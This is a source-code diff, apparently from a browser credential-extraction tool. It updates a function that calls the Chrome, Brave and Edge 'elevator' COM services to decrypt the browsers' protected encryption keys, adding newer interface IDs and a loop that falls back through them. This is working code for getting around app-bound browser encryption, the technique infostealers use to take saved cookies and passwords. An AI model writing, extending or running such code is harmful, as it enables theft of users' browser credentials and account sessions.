@@ -55,6 +55,7 @@ const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
         .clsid          = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } },
         .iid_v1         = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } },
         .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
+        .iid_v3         = {0},
         .decrypt_vtable_idx = IELEVATOR_DECRYPT_IDX,
     },
     [BROWSER_BRAVE] = {
@@ -64,6 +65,7 @@ const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
         .clsid          = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } },
         .iid_v1         = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } },
         .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
+        .iid_v3         = {0},
         .decrypt_vtable_idx = IELEVATOR_DECRYPT_IDX,
     },
     [BROWSER_EDGE] = {
@@ -73,6 +75,7 @@ const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
         .clsid          = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } },
         .iid_v1         = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } },
         .iid_v2         = { 0x8F7B6792, 0x784D, 0x4047, { 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 } },
+        .iid_v3         = { 0x12B23868, 0x6DCD, 0x4D1A, { 0xAD, 0x4C, 0x65, 0xB0, 0x28, 0x52, 0x01, 0xFC } },
         .decrypt_vtable_idx = IEDGE_ELEVATOR_DECRYPT_IDX,
     },
 };
@@ -87,24 +90,26 @@ HRESULT elevator_decrypt_key(BROWSER_ID browser,
     IUnknown* elevator = NULL;
     HRESULT hr;
 
-    // Try IElevator2 first, fall back to IElevator
-    hr = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
-                          &cfg->iid_v2, (void**)&elevator);
-    if (FAILED(hr)) {
+    static const IID null_iid = {0};
+    const IID* iids[] = { &cfg->iid_v3, &cfg->iid_v2, &cfg->iid_v1 };
+    int niids = sizeof(iids) / sizeof(iids[0]);
+
+    for (int i = 0; i < niids && !elevator; i++) {
+        if (memcmp(iids[i], &null_iid, sizeof(IID)) == 0)
+            continue;
         hr = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
-                              &cfg->iid_v1, (void**)&elevator);
+                              iids[i], (void**)&elevator);
     }
 
-    // Hardcoded CLSID failed — resolve dynamically from registry
     if (FAILED(hr) && cfg->service_name) {
         CLSID resolved;
         if (resolve_clsid_from_appid(cfg->service_name, &resolved) &&
             memcmp(&resolved, &cfg->clsid, sizeof(CLSID)) != 0) {
-            hr = CoCreateInstance(&resolved, NULL, CLSCTX_LOCAL_SERVER,
-                                  &cfg->iid_v2, (void**)&elevator);
-            if (FAILED(hr)) {
+            for (int i = 0; i < niids && !elevator; i++) {
+                if (memcmp(iids[i], &null_iid, sizeof(IID)) == 0)
+                    continue;
                 hr = CoCreateInstance(&resolved, NULL, CLSCTX_LOCAL_SERVER,
-                                      &cfg->iid_v1, (void**)&elevator);
+                                      iids[i], (void**)&elevator);
             }
         }
     }
